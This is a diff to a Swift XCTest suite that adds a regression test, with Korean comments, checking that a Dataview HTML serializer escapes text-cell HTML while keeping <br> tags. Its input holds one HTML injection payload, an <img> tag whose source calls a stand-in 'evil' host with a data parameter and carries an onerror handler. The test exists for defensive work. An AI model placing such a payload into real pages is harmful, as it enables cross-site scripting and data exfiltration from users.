@@ -60,6 +60,18 @@ final class DataviewOutputTests: XCTestCase {
                       || html.contains(MarkdownRenderer.wikiLinkHref(target: "한글 노트")))
     }
 
+    func testTextCellEscapesHTMLButKeepsBr() {
+        // 회귀(최종 리뷰 확증): 텍스트 셀 raw 통과가 볼트 메타데이터 유출 채널 —
+        // escape 후 <br>만 복원하는 화이트리스트로 차단.
+        let html = DataviewHTMLSerializer.html(for: [
+            .paragraph(.text("a<br>b<br/>c")),
+            .paragraph(.text("<img src=\"https://evil/?d=x\" onerror=\"y\">")),
+        ])
+        XCTAssertTrue(html.contains("a<br>b<br>c"), "<br> 계열은 살린다")
+        XCTAssertFalse(html.contains("<img"), "그 외 태그는 이스케이프")
+        XCTAssertTrue(html.contains("&lt;img"))
+    }
+
     func testLinkTargetKeepsDottedNameWithoutKnownExtension() {
         // 회귀(리뷰 확증): 확장자 없는 점 든 경로를 deletingPathExtension이 "1.1"로 오절단
         // — LinkedNoteResolver 점-이름 버그(2026-07-01 수정)와 동일 패턴의 재유입 차단.
